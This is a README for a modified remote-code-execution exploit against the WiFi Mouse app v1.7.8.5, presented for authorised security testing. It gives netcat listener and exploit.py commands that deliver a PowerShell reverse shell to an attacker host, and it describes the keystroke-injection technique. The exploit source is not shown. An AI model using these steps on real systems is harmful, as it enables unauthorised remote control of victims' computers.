# WiFi Mouse RCE - Direct Reverse Shell

A modified exploit for WiFi Mouse (v1.7.8.5) that delivers a PowerShell reverse shell directly to the target without requiring payload upload or staging.

## Overview

This exploit leverages an unauthenticated Remote Code Execution vulnerability in WiFi Mouse application by sending specially crafted packets to port 1978. Unlike the original exploit that required payload staging, this version injects a PowerShell reverse shell one-liner directly through the application's command interface.

## Requirements

- Python 3.x
- Target running WiFi Mouse v1.7.8.5 (or potentially other vulnerable versions)
- Network connectivity to target's port 1978

## Usage

1. Set up a netcat listener on your attacking machine:
```bash
nc -lvnp <port>
```

2. Run the exploit:
```bash
python3 exploit.py <target-ip> <attacker-ip> <attacker-port>
```

### Example
```bash
# Setup listener
nc -lvnp 4444

# Execute exploit
python3 exploit.py 192.168.1.100 192.168.1.200 4444
```

## Technical Details

The exploit works by:
1. Opening a connection to the target's WiFi Mouse service on port 1978
2. Sending a command to open cmd.exe
3. Typing a PowerShell reverse shell one-liner character by character
4. Executing the command with an Enter keypress

The PowerShell reverse shell uses a standard TCP client to establish a connection back to the attacker, providing command execution with the privileges of the WiFi Mouse application.

## Modifications from Original

This script is modified from the original WiFi Mouse RCE exploit (EDB-ID: 50972) with the following changes:
- Removed file upload functionality
- Implemented direct PowerShell reverse shell injection
- Simplified usage with straightforward command-line arguments

## Disclaimer

This tool is provided for educational and professional security testing purposes only. Use only against systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.

## Credits

- Original exploit by Alejandro Fanjul
- Modified for direct reverse shell by Illini Tech Services/Jeremy Ison

## License

This project is licensed under the MIT License.
